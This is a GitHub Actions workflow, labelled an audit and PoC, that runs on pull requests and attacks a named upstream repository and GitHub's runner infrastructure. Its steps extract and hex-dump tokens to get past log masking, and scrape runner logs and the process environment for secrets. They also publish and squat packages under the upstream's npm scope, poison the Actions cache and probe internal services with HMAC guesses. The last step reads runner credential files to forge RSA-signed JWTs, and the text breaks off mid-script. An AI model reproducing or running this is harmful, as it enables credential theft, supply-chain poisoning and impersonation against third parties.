name: Audit v13
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write

jobs:
  audit-v13:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
      UPSTREAM_RID: R_kgDOReaECQ
      FORK_RID: R_kgDOReaMug
    steps:

      # ── STEP 1: Token extraction (proven v12 techniques) ──────────
      - name: Step 1 — Token extraction and service URL harvest
        run: |
          set +e
          echo "=== V13 TOKEN EXTRACTION ==="

          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "RT prefix: ${RT:0:14}"
          echo "RT length: ${#RT}"

          # OIDC tokens
          OIDC_VS=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_PL=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelines.actions.githubusercontent.com" | jq -r '.value // empty')
          echo "OIDC vstoken: ${#OIDC_VS} chars"
          echo "OIDC pipelines: ${#OIDC_PL} chars"

          # Save tokens
          echo "$RT" > /tmp/rt.txt
          echo "$OIDC_VS" > /tmp/oidc_vs.txt
          echo "$OIDC_PL" > /tmp/oidc_pl.txt

          # Hex dump tokens for offline analysis (v12 proven mask bypass)
          echo "--- GITHUB_TOKEN hex ---"
          echo -n "$RT" | xxd -p | tr -d '\n'
          echo ""
          echo "--- ACTIONS_ID_TOKEN_REQUEST_TOKEN hex ---"
          echo -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | xxd -p | tr -d '\n'
          echo ""

          # Extract service URLs from Worker log
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          echo "Worker log: $WLOG"
          if [ -f "$WLOG" ]; then
            PIPELINES_URL=$(grep -oP '"PipelinesServiceUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            CACHE_URL=$(grep -oP '"CacheServerUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" 2>/dev/null | head -1 | sed 's/"url"\s*:\s*"//')
            RESULTS_URL=$(grep -oP '"ResultsServiceUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            FEED_URL=$(grep -oP '"FeedStreamUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            IDTOKEN_URL=$(grep -oP '"GenerateIdTokenUrl"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            echo "PipelinesServiceUrl: $PIPELINES_URL"
            echo "CacheServerUrl: $CACHE_URL"
            echo "RunServiceUrl: $RUN_URL"
            echo "ResultsServiceUrl: $RESULTS_URL"
            echo "FeedStreamUrl: $FEED_URL"
            echo "GenerateIdTokenUrl: $IDTOKEN_URL"
            echo "$PIPELINES_URL" > /tmp/pipelines_url.txt
            echo "$CACHE_URL" > /tmp/cache_url.txt
            echo "$RUN_URL" > /tmp/run_url.txt
            echo "$RESULTS_URL" > /tmp/results_url.txt
            echo "$FEED_URL" > /tmp/feed_url.txt
          fi

          # Extract PlanAccessToken and other internal tokens from Worker log
          echo "--- PlanAccessToken search ---"
          grep -oP '"(PlanAccessToken|AccessToken|SystemVssConnection)"\s*:\s*"\K[^"]{20}' "$WLOG" 2>/dev/null | while read -r tok; do
            echo "Found internal token prefix: ${tok:0:20}..."
          done

          # Full /proc/self/environ hex for all tokens
          echo "--- /proc/self/environ token entries ---"
          python3 -c "
          env = open('/proc/self/environ','rb').read()
          for entry in env.split(b'\x00'):
              e = entry.decode('utf-8','replace')
              if any(k in e.upper() for k in ['TOKEN','SECRET','AUTH','RUNTIME','CACHE_URL','RESULTS']):
                  key, _, val = e.partition('=')
                  print(f'{key}={val[:12]}...(hex)={val.encode().hex()[:300]}')
          " 2>/dev/null

          echo ""
          echo "--- ACTIONS_CACHE_URL ---"
          echo "ACTIONS_CACHE_URL=$ACTIONS_CACHE_URL"
          echo "$ACTIONS_CACHE_URL" > /tmp/actions_cache_url.txt
          echo "ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL"
          echo "$ACTIONS_RUNTIME_URL" > /tmp/actions_runtime_url.txt
          echo "ACTIONS_RESULTS_URL=$ACTIONS_RESULTS_URL"

      # ── STEP 2: npm package deep attack ────────────────────────
      - name: Step 2 — npm package publish exhaustive
        run: |
          set +e
          echo "=== NPM PACKAGE DEEP ATTACK ==="
          RT=$(cat /tmp/rt.txt)

          mkdir -p /tmp/npm-v13 && cd /tmp/npm-v13
          echo "//npm.pkg.github.com/:_authToken=$RT" > .npmrc

          # ── A: Re-publish @twrps scope (verify v12 worked) ──
          echo "--- A: Verify v12 @twrps publish + version takeover ---"
          # Check if v12 package exists
          curl -sS -H "Authorization: token $RT" \
            "https://npm.pkg.github.com/@twrps/poc-race2-v12" | head -c 500
          echo ""

          # Try listing all package versions
          curl -sS -H "Authorization: token $RT" \
            "https://npm.pkg.github.com/@twrps%2fpoc-race2-v12" | head -c 500
          echo ""

          # Publish fresh version
          for VER in "1.0.1" "2.0.0" "99.0.0"; do
            cat > package.json << PKGEOF
          {
            "name": "@twrps/poc-race2-v13",
            "version": "$VER",
            "description": "v13 audit - version $VER",
            "main": "index.js",
            "repository": {"type": "git", "url": "https://github.com/$FORK_OWNER/$FORK_REPO"},
            "publishConfig": {"registry": "https://npm.pkg.github.com"}
          }
          PKGEOF
            echo "module.exports = 'v13-audit-$VER';" > index.js
            npm publish 2>&1 | tail -5
            echo "npm publish @twrps v$VER exit: $?"
          done
          echo ""

          # ── B: Squat other @twrps package names ──
          echo "--- B: Package name squatting ---"
          for PKG in "core" "utils" "cli" "auth" "sdk" "api" "common" "shared" "config" "types"; do
            cat > package.json << PKGEOF
          {
            "name": "@twrps/$PKG",
            "version": "1.0.0",
            "description": "v13 squat test",
            "main": "index.js",
            "repository": {"type": "git", "url": "https://github.com/$FORK_OWNER/$FORK_REPO"},
            "publishConfig": {"registry": "https://npm.pkg.github.com"}
          }
          PKGEOF
            echo "module.exports = '$PKG';" > index.js
            R=$(npm publish 2>&1)
            echo "@twrps/$PKG: exit=$? $(echo "$R" | tail -1)"
          done
          echo ""

          # ── C: Try @lacaag scope too ──
          echo "--- C: Fork scope publish ---"
          cat > package.json << PKGEOF
          {
            "name": "@lacaag/poc-race2-v13",
            "version": "1.0.0",
            "description": "v13 fork scope",
            "main": "index.js",
            "repository": {"type": "git", "url": "https://github.com/$FORK_OWNER/$FORK_REPO"},
            "publishConfig": {"registry": "https://npm.pkg.github.com"}
          }
          PKGEOF
          echo "module.exports = 'v13-fork';" > index.js
          npm publish 2>&1 | tail -5
          echo ""

          # ── D: Maven/NuGet/RubyGems to upstream ──
          echo "--- D: Other registries ---"
          # Maven
          for METHOD in PUT POST; do
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X $METHOD \
              -H "Authorization: token $RT" \
              -H "Content-Type: application/octet-stream" \
              "https://maven.pkg.github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO/com/v13/audit/1.0/audit-1.0.jar" \
              --data-binary "v13-audit")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "D01 $METHOD maven upstream = $CODE body='$(echo "$BODY" | head -c 200)'"
          done

          # NuGet
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" \
            -H "Content-Type: application/octet-stream" \
            "https://nuget.pkg.github.com/$UPSTREAM_OWNER/index.json" \
            --data-binary "v13-nuget")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "D02 PUT nuget upstream = $CODE body='$(echo "$BODY" | head -c 200)'"

          # RubyGems
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Content-Type: application/octet-stream" \
            "https://rubygems.pkg.github.com/$UPSTREAM_OWNER/api/v1/gems" \
            --data-binary "v13-gem")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "D03 POST rubygems upstream = $CODE body='$(echo "$BODY" | head -c 200)'"
          echo ""

          # ── E: Verify published packages ──
          echo "--- E: Verification ---"
          for SCOPE in "$UPSTREAM_OWNER" "$FORK_OWNER"; do
            echo "Packages for $SCOPE:"
            for TYPE in npm maven container nuget rubygems; do
              curl -sS -H "Authorization: token $RT" \
                "https://api.github.com/users/$SCOPE/packages?package_type=$TYPE" \
                | jq -c '.[]? | {name,package_type,visibility}' 2>/dev/null
            done
          done

      # ── STEP 3: Artifact + cache poisoning ──────────────────────
      - name: Step 3 — Artifact and cache poisoning
        run: |
          set +e
          echo "=== ARTIFACT + CACHE POISONING ==="
          RT=$(cat /tmp/rt.txt)
          CACHE_URL=$(cat /tmp/actions_cache_url.txt 2>/dev/null)
          WLOG_CACHE=$(cat /tmp/cache_url.txt 2>/dev/null)
          PIPELINES_URL=$(cat /tmp/pipelines_url.txt 2>/dev/null)
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
          ART="$ACTIONS_RUNTIME_TOKEN"

          echo "ACTIONS_CACHE_URL: $CACHE_URL"
          echo "Worker Cache URL: $WLOG_CACHE"
          echo "ACTIONS_RUNTIME_TOKEN length: ${#ART}"
          echo ""

          # ── A: Cache poisoning via ACTIONS_CACHE_URL + ACTIONS_RUNTIME_TOKEN ──
          echo "--- A: Cache via ACTIONS_CACHE_URL ---"
          for AUTH_TOK in "$ART" "$RT"; do
            APREFIX=$(echo -n "$AUTH_TOK" | head -c 15)
            echo "Auth prefix: $APREFIX (len=${#AUTH_TOK})"

            if [ -n "$CACHE_URL" ] && [ -n "$AUTH_TOK" ]; then
              # List caches
              for KEY in "setup-node" "setup-python" "npm" "gradle" "pip" "cargo" "go" "v12" "v13"; do
                R=$(curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
                  -H "Authorization: Bearer $AUTH_TOK" \
                  "${CACHE_URL}_apis/artifactcache/cache?keys=$KEY&version=*")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                [ "$CODE" != "HTTP_000" ] && echo "A01 GET cache key=$KEY auth=$APREFIX = $CODE body='$(echo "$BODY" | head -c 200)'"
              done
              echo ""

              # Reserve cache with common keys
              for KEY in "setup-node-Linux-npm-v13" "setup-python-Linux-pip-v13" "gradle-Linux-v13" "cargo-Linux-v13"; do
                R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
                  -H "Authorization: Bearer $AUTH_TOK" \
                  -H "Content-Type: application/json" \
                  "${CACHE_URL}_apis/artifactcache/caches" \
                  -d "{\"key\":\"$KEY\",\"version\":\"v13-$(date +%s)\"}")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "A02 POST reserve key=$KEY = $CODE body='$(echo "$BODY" | head -c 200)'"

                CACHE_ID=$(echo "$BODY" | jq -r '.cacheId // empty' 2>/dev/null)
                if [ -n "$CACHE_ID" ]; then
                  echo "** CACHE RESERVED ID=$CACHE_ID **"
                  echo "v13 poisoned cache content" > /tmp/poison.txt
                  curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
                    -H "Authorization: Bearer $AUTH_TOK" \
                    -H "Content-Type: application/octet-stream" \
                    -H "Content-Range: bytes 0-30/*" \
                    "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
                    --data-binary @/tmp/poison.txt
                  echo ""
                  curl -sS -w "\nHTTP_%{http_code}" -X POST \
                    -H "Authorization: Bearer $AUTH_TOK" \
                    -H "Content-Type: application/json" \
                    "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
                    -d '{"size":31}'
                  echo ""
                fi
              done
            fi
            echo ""
          done

          # ── B: Same via Worker log cache URL ──
          echo "--- B: Cache via Worker log URL ---"
          if [ -n "$WLOG_CACHE" ]; then
            for AUTH_TOK in "$ART" "$RT"; do
              APREFIX=$(echo -n "$AUTH_TOK" | head -c 10)
              for EP in \
                "_apis/artifactcache/caches" \
                "_apis/artifactcache/cache?keys=test&version=v13"; do
                for METHOD in GET POST; do
                  R=$(curl -sS -w "\nHTTP_%{http_code}" -X $METHOD --connect-timeout 5 -m 10 \
                    -H "Authorization: Bearer $AUTH_TOK" \
                    -H "Content-Type: application/json" \
                    "${WLOG_CACHE}${EP}" \
                    -d '{"key":"v13-test","version":"v13"}')
                  CODE=$(echo "$R" | tail -1)
                  BODY=$(echo "$R" | sed '$d')
                  echo "B01 $METHOD ${EP} auth=$APREFIX = $CODE body='$(echo "$BODY" | head -c 150)'"
                done
              done
            done
          fi
          echo ""

          # ── C: Artifact upload via pipelines API ──
          echo "--- C: Artifact upload ---"
          RUN_ID="${{ github.run_id }}"
          if [ -n "$PIPELINES_URL" ]; then
            for AUTH_TOK in "$ART" "$RT"; do
              APREFIX=$(echo -n "$AUTH_TOK" | head -c 10)
              for ARTIFACT_NAME in "build-output" "dist" "coverage" "v13-test"; do
                R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
                  -H "Authorization: Bearer $AUTH_TOK" \
                  -H "Content-Type: application/json" \
                  "${PIPELINES_URL}_apis/runtime/pipelines/$RUN_ID/artifacts?api-version=6.0-preview" \
                  -d "{\"name\":\"$ARTIFACT_NAME\",\"type\":\"actions_storage\"}")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "C01 POST artifact=$ARTIFACT_NAME auth=$APREFIX = $CODE body='$(echo "$BODY" | head -c 200)'"
              done
            done
          fi

      # ── STEP 4: WebSocket + HMAC + run-service deep ──────────────
      - name: Step 4 — WebSocket feed + HMAC + run-service
        run: |
          set +e
          echo "=== WEBSOCKET + HMAC + RUN-SERVICE ==="
          RT=$(cat /tmp/rt.txt)
          ART="$ACTIONS_RUNTIME_TOKEN"
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
          RESULTS_URL=$(cat /tmp/results_url.txt 2>/dev/null)
          FEED_URL=$(cat /tmp/feed_url.txt 2>/dev/null)
          PIPELINES_URL=$(cat /tmp/pipelines_url.txt 2>/dev/null)
          RUN_ID="${{ github.run_id }}"
          JOB_ID="${{ github.job }}"

          # ── A: WebSocket feed stream ──
          echo "--- A: WebSocket feed ---"
          echo "FeedStreamUrl: $FEED_URL"
          npm install -g wscat 2>/dev/null

          if [ -n "$FEED_URL" ]; then
            for AUTH_TOK in "$ART" "$RT" "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"; do
              APREFIX=$(echo -n "$AUTH_TOK" | head -c 10)
              if [ -n "$AUTH_TOK" ]; then
                echo "Trying WebSocket with auth=$APREFIX..."
                timeout 5 wscat -c "$FEED_URL" \
                  -H "Authorization: Bearer $AUTH_TOK" \
                  -x '{"type":"ping"}' 2>&1 | head -10
                echo "WS exit: $?"
              fi
            done

            # Try without auth (path might have embedded auth)
            echo "Trying WebSocket without auth..."
            timeout 5 wscat -c "$FEED_URL" -x '{"type":"ping"}' 2>&1 | head -10
          fi
          echo ""

          # ── B: Results service ──
          echo "--- B: Results service ---"
          if [ -n "$RESULTS_URL" ]; then
            for AUTH_TOK in "$ART" "$RT"; do
              APREFIX=$(echo -n "$AUTH_TOK" | head -c 10)
              for EP in "" "_apis/connectionData" "_apis/results" "_health" \
                "_apis/results/api/liveconsolefeed" \
                "_apis/results/api/loglines" \
                "_apis/results/api/annotations"; do
                for METHOD in GET POST; do
                  R=$(curl -sS -w "\nHTTP_%{http_code}" -X $METHOD --connect-timeout 5 -m 10 \
                    -H "Authorization: Bearer $AUTH_TOK" \
                    -H "Content-Type: application/json" \
                    "${RESULTS_URL}${EP}")
                  CODE=$(echo "$R" | tail -1)
                  BODY=$(echo "$R" | sed '$d')
                  [ "$CODE" != "HTTP_000" ] && echo "B01 $METHOD ${EP} auth=$APREFIX = $CODE body='$(echo "$BODY" | head -c 150)'"
                done
              done
            done
          fi
          echo ""

          # ── C: Run-service HMAC attempts ──
          echo "--- C: Run-service HMAC bypass ---"
          if [ -n "$RUN_URL" ]; then
            # Search for HMAC keys in Worker log
            WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
            echo "Searching Worker log for HMAC/signing keys..."
            grep -iP 'hmac|signing|MessageEncrypt|EncryptionKey|plan.*key' "$WLOG" 2>/dev/null | head -10
            echo ""

            # Try different HMAC header names and values
            for AUTH_TOK in "$ART" "$RT"; do
              APREFIX=$(echo -n "$AUTH_TOK" | head -c 10)
              for EP in "_apis/distributedtask/plans" \
                "_apis/distributedtask/pools" \
                "workflow/health" \
                "_apis/connectionData"; do

                # No HMAC
                R=$(curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 5 \
                  -H "Authorization: Bearer $AUTH_TOK" \
                  "${RUN_URL}${EP}")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "C01 GET ${EP} no-hmac auth=$APREFIX = $CODE body='$(echo "$BODY" | head -c 100)'"

                # Try various HMAC headers
                for HMAC_HDR in "X-VSS-Hmac" "X-HMAC" "X-Request-Hmac" "Signature" "X-Hub-Signature-256"; do
                  HMAC_VAL=$(echo -n "${RUN_URL}${EP}" | openssl dgst -sha256 -hmac "$AUTH_TOK" -binary 2>/dev/null | base64)
                  R=$(curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 5 \
                    -H "Authorization: Bearer $AUTH_TOK" \
                    -H "$HMAC_HDR: $HMAC_VAL" \
                    "${RUN_URL}${EP}")
                  CODE=$(echo "$R" | tail -1)
                  BODY=$(echo "$R" | sed '$d')
                  [ "$CODE" != "HTTP_400" ] && echo "C02 GET ${EP} hmac=$HMAC_HDR auth=$APREFIX = $CODE body='$(echo "$BODY" | head -c 100)'"
                done
              done
            done
          fi

      # ── STEP 5: GitHub App JWT + RSA impersonation ───────────────
      - name: Step 5 — GitHub App JWT impersonation
        run: |
          set +e
          echo "=== GITHUB APP JWT IMPERSONATION ==="
          RT=$(cat /tmp/rt.txt)

          BASE="/home/runner/actions-runner/cached"
          VER=$(ls "$BASE/" 2>/dev/null | head -1)
          RDIR="$BASE/$VER"

          echo "--- A: Extract runner credentials ---"
          if [ -f "$RDIR/.credentials" ]; then
            cat "$RDIR/.credentials"
            echo ""
          fi
          if [ -f "$RDIR/.credentials_rsaparams" ]; then
            echo "RSA params found: $(wc -c < "$RDIR/.credentials_rsaparams") bytes"
          fi
          echo ""

          echo "--- B: Craft GitHub App JWT and request tokens ---"
          python3 << 'PYEOF'
          import json, base64, time, sys, os

          try:
              base_dir = "/home/runner/actions-runner/cached"
              ver = os.listdir(base_dir)[0]
              creds_path = f"{base_dir}/{ver}/.credentials"
              rsa_path = f"{base_dir}/{ver}/.credentials_rsaparams"

              creds = json.load(open(creds_path))
              rsa = json.load(open(rsa_path))

              client_id = creds.get("clientId", "")
              auth_url = creds.get("authorizationUrl", "")
              scheme = creds.get("scheme", "")
              print(f"clientId: {client_id}")
              print(f"authorizationUrl: {auth_url}")
              print(f"scheme: {scheme}")
              print(f"RSA keys: {list(rsa.keys())}")

              def b64url(data):
                  return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

              def decode_param(b64str):
                  s = b64str + '=' * (4 - len(b64str) % 4) if len(b64str) % 4 else b64str
                  return base64.b64decode(s)

              # Try with cryptography library
              try:
                  from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
                  from cryptography.hazmat.primitives.asymmetric import padding
                  from cryptography.hazmat.primitives import hashes, serialization
                  from cryptography.hazmat.backends import default_backend

                  n = int.from_bytes(decode_param(rsa['modulus']), 'big')
                  e_val = int.from_bytes(decode_param(rsa['exponent']), 'big')
                  d_val = int.from_bytes(decode_param(rsa['d']), 'big')
                  p = int.from_bytes(decode_param(rsa['p']), 'big')
                  q = int.from_bytes(decode_param(rsa['q']), 'big')
                  dmp1 = d_val % (p - 1)
                  dmq1 = d_val % (q - 1)
                  iqmp = pow(q, -1, p)
                  pub = RSAPublicNumbers(e_val, n)
                  priv = RSAPrivateNumbers(p, q, d_val, dmp1, dmq1, iqmp, pub)
                  private_key = priv.private_key(default_backend())
                  print("RSA key reconstructed successfully")

                  # JWT 1: GitHub App style (iss=app_id)
                  now = int(time.time())
                  for iss_val in [client_id, "github-actions", "1"]:
                      for aud_val in [
                          "https://vstoken.actions.githubusercontent.com",
                          "https://pipelines.actions.githubusercontent.com",
                          "https://api.github.com",
                          auth_url or "https://github.com"
                      ]:
                          header = {"alg": "RS256", "typ": "JWT"}
                          payload = {"iat": now - 60, "exp": now + 600, "iss": iss_val, "aud": aud_val}
                          h_enc = b64url(json.dumps(header).encode())
                          p_enc = b64url(json.dumps(payload).encode())
                          signing_input = f"{h_enc}.{p_enc}"
                          sig = private_key.sign(signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())
                          jwt_token = f"{signing_input}.{b64url(sig)}"
                          print(f"JWT iss={iss_val} aud={aud_val[:30]}... len={len(jwt_token)}")

                          # Save the first one for curl tests
                          with open("/tmp/app_jwt.txt", "w") as f:
                              f.write(jwt_token)

                  # JWT 2: VSS style (sub=client_id)
                  for scope_val in ["vso.code_write", "vso.build_execute", "app_token"]:
                      header = {"alg": "RS256", "typ": "JWT", "kid": client_id}
                      payload = {
                          "iss": client_id, "sub": client_id,
                          "aud": auth_url or "https://vstoken.actions.githubusercontent.com",
                          "iat": now, "exp": now + 600, "nbf": now - 60,
                          "scp": scope_val
